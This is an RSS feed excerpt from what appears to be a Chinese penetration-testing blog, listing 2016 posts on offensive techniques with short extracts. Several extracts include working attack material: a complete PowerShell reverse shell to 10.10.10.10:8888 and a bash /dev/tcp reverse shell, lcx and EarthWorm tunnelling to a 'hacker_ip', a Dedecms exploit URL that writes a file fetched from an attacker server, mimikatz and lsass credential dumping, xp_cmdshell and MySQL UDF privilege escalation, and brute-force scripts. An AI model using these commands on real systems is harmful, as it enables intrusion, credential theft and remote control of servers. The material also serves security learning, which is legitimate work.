      <description>0x00 关于Pocsuite Pocsuite 是知道创宇安全研究团队打造的一款基于漏洞与 POC 的远程漏洞验证框架。可以让我们不用考虑过多的细节，只要考虑验证代码就可以，它封装了一些我们常用的东西，比如requests，在我们平常使用requests是要考虑cookie、要考虑header，但是在框架下则不需要有这些考虑，因为这些东西框架都帮你解决了。
0x01 简单介绍  安装  使用pip install pocsuite即可安装   常用参数  -u 指定一个目标url -f 指定一个存放目标url的文件 -r 指定一个存放poc的文件夹 &amp;ndash;report 导出结果到html文件 &amp;ndash;cookie 携带cookie &amp;ndash;referer 修改referer &amp;ndash;user-agent 修改UA  模式  执行一个poc有两种模式  --verify 漏洞验证模式(只是验证，不能更改服务器的东西) --attack 漏洞利用模式  示例  pocsuite -u &amp;quot;http://www.xxxx.com&amp;quot; -r poc_path/poc_name.py --atack   poc编写
 可以新建一个文件夹，命名为mypoc，里面就放你自己写的poc(当然也可以在mypoc里新建文件夹放一类poc，对poc进行分类) 此时示例(对目标进行常见服务的测试，加载一类多个poc脚本)  pocsuite -u &amp;quot;http://www.xxxx.com&amp;quot; -r poc_path/server/ --verify   poc的命名规范
 漏洞ID_版本号_漏洞类型(其中不能有大写字母，所有符号要改为&amp;quot;_&amp;quot;),大致如下：  _xxxx_struct2_2016_s2_016_code_execution.</description>
    </item>
    
    <item>
      <title>Python实现多线程弱口令爆破</title>
      <link>https://wyb0.com/posts/2016/python-multi-threaded-weak-password-blasting/</link>
      <pubDate>Fri, 26 Aug 2016 17:53:51 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/python-multi-threaded-weak-password-blasting/</guid>
      <description>0x00 脚本 #!/usr/bin/env python # -*- coding: utf-8 -*- &#39;this script can bruter ftp/ssh/mysql&#39; __author__ = &#39;reber&#39; import Queue import threading import time import logging import socket from optparse import OptionParser import paramiko from ftplib import FTP import MySQLdb #################公有类################# class CommonFun(object): &amp;quot;&amp;quot;&amp;quot;docstring for CommonFun&amp;quot;&amp;quot;&amp;quot; def __init__(self): super(CommonFun, self).__init__() def set_log(self,lname): logger = logging.getLogger(lname) logger.setLevel(logging.DEBUG) ch = logging.StreamHandler() ch.setLevel(logging.DEBUG) formatter = logging.Formatter(&#39;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#39;) ch.setFormatter(formatter) logger.</description>
    </item>
    
    <item>
      <title>Metasploit利用workspace进行批量扫描爆破</title>
      <link>https://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/</link>
      <pubDate>Tue, 23 Aug 2016 10:05:52 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/</guid>
      <description>0x00 启动 0x01 Metasploit的工作平台 在msf里的工作平台可以保存历史的一些操作信息 0x02 使用db_nmap扫描主机 扫描后的结果会保留在工作平台中，可以用hosts和services进行查看： 0x03 使用msf的模块进行弱口令爆破 注：这里针对ftp服务进行弱口令测试 使用vulns可以查看结果：msf auxiliary(ftp_login) &amp;gt; vulns</description>
    </item>
    
    <item>
      <title>Ubuntu下安装Metasploit</title>
      <link>https://wyb0.com/posts/2016/ubuntu-install-metasploit/</link>
      <pubDate>Thu, 18 Aug 2016 10:38:41 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/ubuntu-install-metasploit/</guid>
      <description>0x00 安装Metasploit  下载msfinstall脚本
$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall  修改文件权限
$ chmod 755 msfinstall  安装(可能时间较久)
$ ./msfinstall  更新exp
$ msfupdate   0x01 连接数据库  首先启动postgresql数据库
$ /etc/init.d/postgresql start #service postgresql start也可以  初始化MSF数据库(关键步骤)
$ msfdb init  运行msfconsole
$ msfconsole  在msf中查看数据库连接状态
msf &amp;gt; db_status #若出现错误：Module database cache not built yet, using slow search #则重新构建缓存，缓存构建通常需要5-10分钟左右。 #构建完成后，退出Metasploit控制台，然后重新进入即可使用数据库缓存进行搜索模块 msf &amp;gt; db_rebuild_cache   0x02 Metasploit Cheat Sheet 常见命令可以看下 https://www.</description>
    </item>
    
    <item>
      <title>BurpSuite抓手机包</title>
      <link>https://wyb0.com/posts/2016/burpsuite-intercept-packets-of-phone/</link>
      <pubDate>Sat, 13 Aug 2016 23:53:39 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/burpsuite-intercept-packets-of-phone/</guid>
      <description> 0x00 环境设置 Windows Phone手机和电脑处于同一无线环境下： 0x01 BurpSuite设置 0x02 抓HTTP包 0x03 抓HTTPS包  挂burpsuite的代理下载证书  把证书上传到你自己的服务器上(也可以本地搭建网站)，然后手机访问证书
安卓手机修改证书后缀为crt，证书可以放在网站上，也可以直接拖到手机上，然后安装  抓https数据包   </description>
    </item>
    
    <item>
      <title>Web常见漏洞脑图</title>
      <link>https://wyb0.com/posts/2016/mind-map-of-web-common-vulnerabilities/</link>
      <pubDate>Thu, 11 Aug 2016 21:17:21 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/mind-map-of-web-common-vulnerabilities/</guid>
      <description>Web常见漏洞</description>
    </item>
    
    <item>
      <title>Linux下系统漏洞提权</title>
      <link>https://wyb0.com/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/</link>
      <pubDate>Tue, 09 Aug 2016 19:23:13 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/</guid>
      <description>0x00 Linux下的提权 Linux下一般都是系统漏洞提权，分为以下几个步骤：
1. 获取系统版本号 2. 根据系统版本号找对应exp 3. 反弹shell 4. 尝试利用  0x01 提权  获取系统版本号  获取发行版本  cat /etc/*-release cat /etc/issue cat /etc/lsb-release cat /etc/redhat-release  获取内核版本  cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz   根据系统版本号找对应exp  http://www.exploit-db.com http://1337day.com http://www.securiteam.com http://www.securityfocus.com http://www.exploitsearch.net http://metasploit.com/modules http://securityreason.com http://seclists.org/fulldisclosure http://www.google.com  反弹shell  本地：nc -l -p 8888 目标机器：/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.</description>
    </item>
    
    <item>
      <title>端口转发</title>
      <link>https://wyb0.com/posts/2016/port-forwarding/</link>
      <pubDate>Mon, 08 Aug 2016 19:33:45 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/port-forwarding/</guid>
      <description> 0x00 应用场景  内网IP的80端口通过端口映射到了外网IP的80端口上 内网的Web服务器通过外网IP反向代理(如Nginx) 也就是说Web服务器在内网中  0x01 判断Web是否为内网  向ping域名，查看IP是外网 用webshell查看ip却是内网IP  0x02 端口转发工具  lcx htran EarthWorm netsh reGeorg meterpreter porfwd  0x03 lcx端口转发  Hacker：lcx.exe -listen 500 8888 Victim：lcx.exe -slave hacker_ip 500 victim_ip 3389 Hacker：cmd mstsc hacker_ip:500  0x04 EarchWorm端口转发  Hacker：./ew -s rcsocks -l 1080 -e 8888 Victim：./ew -s rssocks -d hacker_ip -e 8888 1. 启动EarchWorm 2. hacker主机使用代理 3. hacker内网主机连接目标的内网主机   </description>
    </item>
    
    <item>
      <title>导出Windows主机密码与开启3389</title>
      <link>https://wyb0.com/posts/2016/export-host-password-and-open-3389/</link>
      <pubDate>Mon, 08 Aug 2016 08:28:27 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/export-host-password-and-open-3389/</guid>
      <description>0x00 导出主机密码hash  关于Windows的hash
 早期IBM设计的LM Hash算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即NTLM Hash Windows hash由LM HASH和NT HASH两部分组成，形式为：用户名称:RID:LM-HASH值:NT-HASH值 存储Windows hash的sam文件位置为：C:\windows\system32\config\SAM  导出hash条件
 administrator以上权限  导出hash工具
 wce gethash hashdump SAMInside  上传工具得到hash  在线网站解密hash
 LM Hash和NT Hash得到一个就可以解密，不过两个都得到的话解密的成功率会更高 可以在http://www.objectif-securite.ch/ophcrack.php解密    0x01 导出主机密码  条件
 administrator以上权限 当前管理员没有注销登陆(可以通过query user命令看出)  工具
 mimikatz getpass  上传工具得到密码  导出NTLM Hash本地得到密码
若 mimikatz 和 getpass 这类软件被杀的话可以先用Procdump导出lsass.dmp，然后本地用mimikatz解密
 导出文件 hash 文件
 上传 Procdump.exe 导出   Procdump.</description>
    </item>
    
    <item>
      <title>Windows下第三方服务提权</title>
      <link>https://wyb0.com/posts/2016/windows-use-third-party-server-elevate-privileges/</link>
      <pubDate>Sun, 07 Aug 2016 23:38:58 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/windows-use-third-party-server-elevate-privileges/</guid>
      <description> 0x00 MSSQL提权 MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权
提权条件：数据库账号是DBA权限
 关于xp_cmdshell
 得到数据库连接信息，连接数据库后执行EXEC xp_cmdshell &#39;net user&#39;; 有sql注入时也可以直接在url上使用xp_cmdshell，因为mssql可以多语句执行，例如?id=1;EXEC xp_cmdshell &#39;net user&#39;;--  连接数据库  执行系统命令  添加用户  远程连接   0x01 MySQL提权 环境：web应用服务器权限较低
提权条件：MySQL是system权限
 关于UDF  MySQL提权可以用UDF和Mof。UDF就是User defined Function，即用户定义函数，可以通过创建存储方法来定义函数，从而调用系统命令。
 UDF提权过程
 导入udf.dll到服务器指定目录
 MySQL版本小于5.1的udf.dll要导入到c:\windows\目录下
 MySQL版本大于等于5.1的udf.dll要导入到plugin_dir目录，plugin_dir在MySQL安装目录下的lib/plugin目录下(MySQL安装目录可以用select @@basedir得到)，默认不存在这个目录，我们要自己创建  使用SQL语句创建功能函数
CREATE FUNCTION shell RETURNS STRING SONAME &amp;lsquo;udf.dll&amp;rsquo;; 执行MySQL语句调用新创建的函数
select shell(&amp;lsquo;cmd&amp;rsquo;,&amp;lsquo;whoami&amp;rsquo;); 删除创建的函数
drop function shell;  查看基本信息  上传udf提权  添加用户  远程连接   </description>
    </item>
    
    <item>
      <title>Windows下系统漏洞提权</title>
      <link>https://wyb0.com/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/</link>
      <pubDate>Sun, 07 Aug 2016 21:31:35 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/</guid>
      <description> 提权是在已经getshell但是权限不大的前提下做的
0x00 查看基本信息 0x01 使用cmd执行命令  尝试使用cmd执行命令  找可写目录  尝试上传cmd.exe  写一个aspx马  上传cmd.exe  再次尝试使用cmd执行命令   0x02 权限提升  查看未安装补丁
systeminfo&amp;gt;a.txt&amp;amp;(for %i in (KB952004 KB956572 KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165 KB958644) do @type a.txt|@find /i &amp;quot;%i&amp;quot;||@echo %i Not Installed!)&amp;amp;del /f /q /a a.txt   上传exp提权   0x03 添加用户  添加远程连接用户  0x04 使用3389远程连接 </description>
    </item>
    
    <item>
      <title>反弹shell小结</title>
      <link>https://wyb0.com/posts/2016/reverse-shell/</link>
      <pubDate>Sat, 06 Aug 2016 08:36:53 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/reverse-shell/</guid>
      <description>当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令
0x00 PowerShell #更换ip和端口即可 本地：nc -lv 8888 目标：powershell -w hidden -nop -c function RSC{if ($c.Connected -eq $true) {$c.Close()};if ($p.ExitCode -ne $null) {$p.Close()};exit;};$a=&#39;10.10.10.10&#39;;$p=&#39;8888&#39;;$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName=&#39;cmd.exe&#39;;$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){$o += $e.GetString($os.Read())};$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;while (-not $d) {if ($c.Connected -ne $true) {RSC};$pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) {$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;if (-not $pos -or $pos -eq 0) {RSC};if ($nb[0..$($pos-1)] -contains 10) {break}};if ($pos -gt 0){$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if ($p.ExitCode -ne $null){RSC}else{$o=$e.GetString($os.Read());while($os.Peek() -ne -1){$o += $e.</description>
    </item>
    
    <item>
      <title>Dedecms远程写文件漏洞</title>
      <link>https://wyb0.com/posts/2016/dedecms-remote-write-file-vulnerability/</link>
      <pubDate>Fri, 05 Aug 2016 23:29:20 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/dedecms-remote-write-file-vulnerability/</guid>
      <description> 0x00 关于漏洞 Dedecms在20150618之前的版本都存在远程写文件漏洞，主要起因是Apache的解析漏洞  0x01 利用条件 dedecms版本为20150618之前的 安装目录install下的index.php.bak文件未被删除  0x02 实例  查看cms版本  清空文件
http://www.xxxx.com/install/index.php.bak?step=11&amp;amp;insLockfile=a &amp;amp;s_lang=a&amp;amp;install_demo_name=../data/admin/config_update.php 访问上面的链接会使服务器到http://updatenew.dedecms.com/base-v57/dedecms/ demodata.a.txt中读取内容写入到config_update.php，但demodata.a.txt为空， 所以就清空了config_update.php   在自己的服务器上创建文件  写入文件
访问http://www.xxxx.com/install/index.php.bak?step=11&amp;amp;insLockfile=a &amp;amp;s_lang=a&amp;amp;install_demo_name=info.php&amp;amp;updateHost=http://123.123.123.123/ 将自己的网站的dedecoms/demodata.a.txt写入到目标站点的install/下的info.php中   访问生成的文件   </description>
    </item>
    
    <item>
      <title>Redis未授权访问漏洞</title>
      <link>https://wyb0.com/posts/2016/redis-unauthorized-access/</link>
      <pubDate>Thu, 04 Aug 2016 15:52:26 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/redis-unauthorized-access/</guid>
      <description> 0x00 Redis的未授权访问 若Redis服务器对公网开放，且未启用认证，则攻击者可以未授权访问服务器。
若Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，通过SSH登录受害服务器。
0x01 写shell 连接目标主机的redis写文件 0x02 向Redis服务器上传SSH公钥 0x03 通过计划任务反弹shell </description>
    </item>
    
    <item>
      <title>Tomcat部署War包getshell</title>
      <link>https://wyb0.com/posts/2016/tomcat-deploy-war-package-to-getshell/</link>
      <pubDate>Tue, 02 Aug 2016 22:30:13 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/tomcat-deploy-war-package-to-getshell/</guid>
      <description>0x00 关于 War 包 War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码, 以及Java的代码。当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布 则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录,当Tomcat 服务器启动时,War包也会随之被解压后自动部署。  0x01 上传 War 包 GetShell  找到后台猜密码然后登录  上传 War 包
  运行 jar -cf job.war ./job.jsp 生成 war 包
或者先将 jsp 大马压缩为 zip，再将 zip 后缀改名为 war ，然后上传 war 包
0x02 漏洞防御  后台使用强密码 删除Tomcat下的manager文件夹  0x03 附爆破弱口令代码 #!/usr/bin/env python #-*- coding:utf-8 -*- import requests import json import base64 import sys import Queue import threading &amp;quot;&amp;quot;&amp;quot; 简单爆破后台登陆密码 Usage: python tomcat.</description>
    </item>
    
    <item>
      <title>BurpSuite的Intruder模块</title>
      <link>https://wyb0.com/posts/2016/burpsuite-intruder-module/</link>
      <pubDate>Mon, 01 Aug 2016 09:17:38 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/burpsuite-intruder-module/</guid>
      <description> 0x00 示例一 0x01 示例二 </description>
    </item>
    
    <item>
      <title>逻辑漏洞</title>
      <link>https://wyb0.com/posts/2016/logical-loophole/</link>
      <pubDate>Sun, 31 Jul 2016 18:43:49 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/logical-loophole/</guid>
      <description>0x00 逻辑漏洞 逻辑漏洞是一种业务逻辑上的设计缺陷，业务流存在问题。 这里说一下密码找回漏洞、多线程条件竞争漏洞和支付漏洞。
0x01 密码找回漏洞  测试流程
 先尝试正确的密码找回流程，记录不同找回方式的所有数据包 分析数据包，找到有效数据部分 推测数据构造方法 构造数据包验证猜测  分类
 邮箱找回
一般是点击邮件中的链接后会转跳到修改密码的页面，需要分析链接的token构造，可以考虑是时间戳md5、用户名或邮箱和随机字符串md5等，一般是类似如下链接： http://domain/findpwd.php?u=xiaoming&amp;amp;token=MTIzQHFxLmNvbQ== http://domain/findpwd.php?id=374&amp;amp;token=2ad64bf14c714dbce88c7993663da7da 当构造相应链接时就可以重置任意用户的密码  手机短信找回
短信找回一般就是4位或6位验证码，暴力猜测吧  找回逻辑错误
若恶意用户A用15123333333找回密码，此时收到验证码但不使用 此时恶意用户A再用受害者B的手机号找回密码 用户A在B的验证表单填入自己收到的验证码，发送 此时跳转的修改密码页面修改的就是用户B的密码  直接修改密码
在修改密码时跳过选择找回方式，直接访问修改密码的页面进行修改  本地验证
随意输入一个验证码，开Burp抓包，forward，抓返回包，返回包里可能有一个flag字段， 若flag的值为1则跳转到修改密码页面，所以只要修改返回包即可  服务端将验证码返回给浏览器
在点击获取验证码时，服务器会将验证码发送给浏览器，抓包即可  验证码直接出现在url中
当点击获取验证码时发出的请求链接中直接有code  密保问题找回
回答密保问题，有时一些答案就在html源码里    0x02 多线程条件竞争漏洞 多线程条件竞争漏洞是一种服务端的漏洞，服务端是并发处理用户请求的，若并发处理不当或相关操作逻辑设计有缺陷时就会产生一些安全问题。
 文件上传  服务端可以sudo apt-get install inotify-tools安装监听文件的软件，执行inotifywait -m /var/www/html/admin监听admin文件夹中文件的变化
//uploads.php代码如下，仅供测试： &amp;lt;meta charset=&#39;utf-8&#39;&amp;gt; &amp;lt;?php $allowtype = array(&amp;quot;gif&amp;quot;,&amp;quot;png&amp;quot;,&amp;quot;jpg&amp;quot;); $size = 10000000; $path = &amp;quot;.</description>
    </item>
    
    <item>
      <title>敏感信息泄露</title>
      <link>https://wyb0.com/posts/2016/sensitive-information-leakage/</link>
      <pubDate>Thu, 28 Jul 2016 22:42:58 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/sensitive-information-leakage/</guid>
      <description>0x00 软件敏感信息 * 操作系统版本 可用namp扫描得知 * 中间件的类型、版本 http返回头 404报错页面 使用工具(如whatweb) * Web程序(cms类型及版本、敏感文件) 可用whatweb、cms_identify  0x01 Web敏感信息 * phpinfo()信息泄露 http://[ip]/test.php和http://[ip]/phpinfo.php * 测试页面泄露在外网 test.cgi、phpinfo.php、info.php等 * 编辑器备份文件泄露在外网 http://[ip]/.test.php.swp http://[ip]/test.php.bak http://[ip]/test.jsp.old http://[ip]/cgi~ 常见编辑器备份后缀 * 版本管理工具(如git)文件信息泄露 http://[ip]/.git/config http://[ip]/CVS/Entriesp http://[ip]/.svn/entriesp * HTTP认证泄露漏洞 http://[ip]/basic/index.php Web目录开启了HTTP Basic认证，但未限制IP，导致可暴力破解账号、密码 * 管理后台地址泄露 http://[ip]/login.php http://[ip]/admin.php http://[ip]/manager.php http://[ip]/admin_login.php * 泄露员工邮箱、分机号码 泄露邮箱及分机号码可被社工，也可生成字典 * 错误页面暴漏信息 mysql错误、php错误、暴漏cms版本等 * 探针文件 * robots.txt * phpMyAdmin * 网站源码备份文件(www.rar/sitename.tar.gz/web/zip等) * 其他  0x02 网络信息泄露 * DNS域传送漏洞 * 运维监控系统弱口令、网络拓扑泄露 zabbix弱口令、zabbix sql注入等  0x03 第三方软件应用 * github上源码、数据库、邮箱密码泄露 搜类似：smtp 163 password关键字 * 百度网盘被员工不小心上传敏感文件 * QQ群被员工不小心上传敏感文件  0x04 敏感信息搜集工具 https://github.</description>
    </item>
    
    <item>
      <title>任意文件查看与下载漏洞</title>
      <link>https://wyb0.com/posts/2016/any-file-view-and-download-vulnerability/</link>
      <pubDate>Wed, 27 Jul 2016 23:25:18 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/any-file-view-and-download-vulnerability/</guid>
      <description>0x00 漏洞介绍 一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞
0x01 利用条件 * 存在读文件的函数 * 读取文件的路径用户可控且未校验或校验不严 * 输出了文件内容  0x02 漏洞危害 下载服务器任意文件，如脚本代码、服务及系统配置文件等 可用得到的代码进一步代码审计，得到更多可利用漏洞  0x03 任意文件读取 代码形式可如下几种：
&amp;lt;?php $filename = &amp;quot;test.txt&amp;quot;; readfile($filename); ?&amp;gt; &amp;lt;?php $filename = &amp;quot;test.txt&amp;quot;; $fp = fopen($filename,&amp;quot;r&amp;quot;) or die(&amp;quot;Unable to open file!&amp;quot;); $data = fread($fp,filesize($filename)); fclose($fp); echo &amp;quot;&amp;lt;pre&amp;gt;&amp;quot;; print_r(htmlspecialchars($data)); echo &amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;; ?&amp;gt; &amp;lt;?php $filename = &amp;quot;test.txt&amp;quot;; $data = file_get_contents($filename); echo &amp;quot;&amp;lt;pre&amp;gt;&amp;quot;; print_r(htmlspecialchars($data)); echo &amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;; ?&amp;gt;  0x04 任意文件下载 直接下载：
&amp;lt;a href=&amp;quot;http://www.xx.com/a.zip&amp;quot;&amp;gt;Download&amp;lt;/a&amp;gt;  用header()下载：</description>
    </item>
    
    <item>
      <title>文件包含漏洞</title>
      <link>https://wyb0.com/posts/2016/file-include-vulnerabilities/</link>
      <pubDate>Tue, 26 Jul 2016 09:24:22 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/file-include-vulnerabilities/</guid>
      <description>环境：phpStudy 2016、DVWA v1.10
0x00 文件包含 程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。
程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。
几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多,而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。
在PHP中经常出现包含漏洞，但这并不意味这其他语言不存在。
0x01 常见文件包含函数 include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行 require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本 include_once()和require_once()：若文件中代码已被包含则不会再次包含  0x02 利用条件  程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件 用户能够控制该动态变量  注：PHP中只要文件内容符合PHP语法规范，包含时不管扩展名是什么都会被PHP解析， 若文件内容不符合PHP语法规范则会暴漏其源码。包含不存在的文件则可能暴露路径  0x03 漏洞危害  执行任意代码 读取文件源码或敏感信息 包含恶意文件控制网站 甚至控制服务器  0x04 漏洞分类  本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码  读敏感文件，读PHP文件 包含日志文件GetShell 上传图片马，然后包含从而GetShell 包含/proc/self/envion文件GetShell 包含data:或php://input等伪协议 若有phpinfo则可以包含临时文件  远程文件包含：可以直接执行任意代码  要保证php.ini中allow_url_fopen和allow_url_include要为On   0x05 漏洞挖掘  上AWVS或者自己写代码测试
 0x06 本地包含GetShell  简单代码示例  &amp;lt;?php if (@$_GET[&#39;page&#39;]) { include(&amp;quot;./action/&amp;quot;.$_GET[&#39;page&#39;]); } else { include &amp;quot;.</description>
    </item>
    
    <item>
      <title>PHP反序列化漏洞</title>
      <link>https://wyb0.com/posts/2016/php-deserialize-vulnerabilities/</link>
      <pubDate>Mon, 25 Jul 2016 23:32:52 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/php-deserialize-vulnerabilities/</guid>
      <description>0x00 关于反序列化漏洞 序列化：使用函数serialize()可将实例序列化为字符串
反序列化：使用函数unserialize()可将序列化的字符串还原
 服务端有test.php，代码如下  &amp;lt;?php class fun{ public $msg; function __construct(){ echo &#39;__construct&#39;; } function __destruct() { eval($this-&amp;gt;msg); } } $d = $_REQUEST[&#39;str&#39;]; var_dump($d); echo &amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; $tc = unserialize($d); var_dump($tc); ?&amp;gt;   客户端可构造如下代码生成序列化后的字符串  &amp;lt;?php class fun{ public $msg; function __construct(){ echo &#39;__construct&#39;; } function __destruct() { eval($this-&amp;gt;msg); } } $f = new fun(); $f-&amp;gt;msg = &amp;quot;system(&#39;ls /etc/ssh&#39;);&amp;quot;; echo serialize($f); ?&amp;gt;  生成的序列化字符串为：O:3:&amp;quot;fun&amp;quot;:1:{s:3:&amp;quot;msg&amp;quot;;s:22:&amp;quot;system(&#39;ls /etc/ssh&#39;);&amp;quot;;}</description>
    </item>
    
    <item>
      <title>代码执行漏洞(一)</title>
      <link>https://wyb0.com/posts/2016/code-execution-vulnerabilities/</link>
      <pubDate>Mon, 25 Jul 2016 22:32:51 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/code-execution-vulnerabilities/</guid>
      <description>0x00 代码执行 当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。
0x01 相关函数 PHP：eval assert Python：exec asp：&amp;lt;%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%&amp;gt; Java：没有类似函数，但采用的反射机制和各种基于反射机制的表达式引擎(OGNL、SpEL、MVEL等)有类似功能  0x02 phpcms中的string2array函数 这个函数可以将phpcms的数据库settings的字符串形式的数组内容转换为真实的数组
array( //这个是字符串形式的数组，它并不是数组，而是字符串 &#39;upload_maxsize&#39; =&amp;gt; &#39;2048&#39;, &#39;upload_allowext&#39; =&amp;gt; &#39;jpg|jpeg|gif|bmp|png|doc|docx|xls|xlsx|ppt|pptx|pdf|txt|rar|zip|swf&#39;, &#39;watermark_enable&#39; =&amp;gt; &#39;1&#39;, &#39;watermark_minwidth&#39; =&amp;gt; &#39;300&#39;, &#39;watermark_minheight&#39; =&amp;gt; &#39;300&#39;, &#39;watermark_img&#39; =&amp;gt; &#39;/statics/img/water/mark.png&#39;, &#39;watermark_pct&#39; =&amp;gt; &#39;85&#39;, &#39;watermark_quality&#39; =&amp;gt; &#39;80&#39;, &#39;watermark_pos&#39; =&amp;gt; &#39;9&#39;, )  function string2array($data) { //这个函数可以将字符串$data转化为数组 if($data == &#39;&#39;) return array(); @eval(&amp;quot;\$array = $data;&amp;quot;); return $array; }  0x03 漏洞危害  执行代码 让网站写shell 甚至控制服务器  0x04 漏洞分类(也是利用点) 执行代码的函数：eval、assert callback函数：preg_replace + /e模式 反序列化：unserialize()(反序列化函数)  0x05 漏洞挖掘 框架找漏洞，如ThinkPHP： inurl:index.</description>
    </item>
    
    <item>
      <title>命令执行漏洞</title>
      <link>https://wyb0.com/posts/2016/command-execution-vulnerabilities/</link>
      <pubDate>Sun, 24 Jul 2016 14:32:51 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/command-execution-vulnerabilities/</guid>
      <description>0x00 命令执行 应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、 passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令 拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。  0x01 利用条件  应用调用执行系统命令的函数 将用户输入作为系统命令的参数拼接到了命令行中 没有对用户输入进行过滤或过滤不严  0x02 漏洞分类  代码层过滤不严
商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：
system(&amp;ldquo;/bin/program --arg $arg&amp;rdquo;); 系统的漏洞造成命令执行
bash破壳漏洞(CVE-2014-6271)
执行env x=&#39;() { :;}; echo vulnerable&#39; bash -c &amp;quot;echo this is a test&amp;quot;后
若输出vulnerable则证明存在漏洞 调用的第三方组件存在代码执行漏洞
如WordPress中用来处理图片的ImageMagick组件
JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等)
ThinkPHP命令执行  0x03 漏洞危害  继承Web服务程序的权限去执行系统命令或读写文件 反弹shell 控制整个网站甚至控制服务器 进一步内网渗透 等等  0x04 漏洞挖掘 可以google hacking
尝试：filetype:action或filetype:do来找struts2
0x05 漏洞可能代码(以system为例) 1. system(&amp;quot;$arg&amp;quot;); //直接输入即可 2. system(&amp;quot;/bin/prog $arg&amp;quot;); //直接输入;ls 3. system(&amp;quot;/bin/prog -p $arg&amp;quot;); //和2一样 4.</description>
    </item>
    
    <item>
      <title>文件上传之文本编辑器上传漏洞</title>
      <link>https://wyb0.com/posts/2016/file-upload-editor-upload-vulnerability/</link>
      <pubDate>Thu, 21 Jul 2016 15:11:29 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/file-upload-editor-upload-vulnerability/</guid>
      <description> 0x00 文本编辑器 常见的文本编辑器有CKEditor、eWebEditor、UEditor、KindEditor、xhEditor等，它们的功能类似且都有图片上传、视频上传、远程下载等功能，这类文本编辑器也称为富文本编辑器。
0x01 FCKeditor 下面以FCKeditor(现名为CKEditor)为例：
